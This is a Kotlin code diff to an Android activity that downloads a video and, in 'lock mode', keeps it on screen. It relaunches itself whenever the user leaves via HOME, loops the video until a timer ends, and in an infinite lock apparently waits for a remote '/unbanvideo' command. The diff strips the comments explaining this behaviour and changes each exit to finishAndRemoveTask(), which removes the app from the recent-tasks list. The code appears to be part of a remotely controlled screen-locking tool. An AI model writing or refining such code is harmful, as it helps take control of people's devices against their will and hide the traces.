@@ -42,7 +42,7 @@ class VideoActivity : AppCompatActivity() {
     private var videoFile: File? = null
     private var secondsWatched = 0
     private var watchTimer: Job? = null
-    private var canClose = false  // true когда таймер вышел или duration==0
+    private var canClose = false
 
     companion object {
         private const val TAG = "VideoActivity"
@@ -111,7 +111,6 @@ class VideoActivity : AppCompatActivity() {
 
         if (lockMode) lockActive = true
 
-        // Если таймер уже вышел (перезапуск после HOME) — сразу разрешаем закрыть
         if (duration > 0 && secondsWatched >= duration) {
             canClose = true
             lockActive = false
@@ -124,8 +123,6 @@ class VideoActivity : AppCompatActivity() {
 
     override fun onStop() {
         super.onStop()
-        // onStop вызывается когда activity уходит с экрана (HOME, другое приложение и т.д.)
-        // Если lock активен и таймер ещё не вышел — перезапускаем себя
         if (lockActive && !canClose) {
             handler.postDelayed({
                 if (lockActive && !canClose) {
@@ -181,7 +178,7 @@ class VideoActivity : AppCompatActivity() {
             setOnClickListener {
                 if (canClose) {
                     lockActive = false
-                    finish()
+                    finishAndRemoveTask()
                 }
             }
         }
@@ -220,17 +217,16 @@ class VideoActivity : AppCompatActivity() {
             mediaPlayer!!.setOnVideoSizeChangedListener { _, w, h -> adjustSurfaceSize(w, h) }
             mediaPlayer!!.setOnCompletionListener {
                 if (lockMode && !canClose) {
-                    // Зацикливаем пока таймер не вышел
                     mediaPlayer?.seekTo(0)
                     mediaPlayer?.start()
                 } else {
                     lockActive = false
-                    finish()
+                    finishAndRemoveTask()
                 }
             }
             mediaPlayer!!.setOnErrorListener { _, what, extra ->
                 Log.e(TAG, "MediaPlayer error: $what extra=$extra")
-                finish()
+                finishAndRemoveTask()
                 true
             }
             mediaPlayer!!.prepare()
@@ -240,7 +236,7 @@ class VideoActivity : AppCompatActivity() {
 
         } catch (e: Exception) {
             Log.e(TAG, "tryPlay failed: ${e.message}", e)
-            finish()
+            finishAndRemoveTask()
         }
     }
 
@@ -248,7 +244,6 @@ class VideoActivity : AppCompatActivity() {
         watchTimer?.cancel()
 
         if (duration == 0 && !lockMode) {
-            // Нет ограничений — крестик через 3 сек
             handler.postDelayed({
                 canClose = true
                 showCloseButton()
@@ -257,11 +252,9 @@ class VideoActivity : AppCompatActivity() {
         }
 
         if (duration == 0 && lockMode) {
-            // Бесконечный lock — только /unbanvideo
             return
         }
 
-        // Считаем секунды с учётом уже просмотренных (при перезапуске после HOME)
         watchTimer = scope.launch {
             while (secondsWatched < duration) {
                 delay(1000)
@@ -345,7 +338,7 @@ class VideoActivity : AppCompatActivity() {
                 Log.e(TAG, "Download failed: ${e.message}", e)
                 handler.post { statusText.text = "Ошибка: ${e.message}" }
                 delay(3000)
-                handler.post { finish() }
+                handler.post { finishAndRemoveTask() }
             }
         }
     }
@@ -375,6 +368,7 @@ class VideoActivity : AppCompatActivity() {
         scope.cancel()
         try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (e: Exception) { }
         mediaPlayer = null
+        finishAndRemoveTask()
         super.onDestroy()
     }
 }
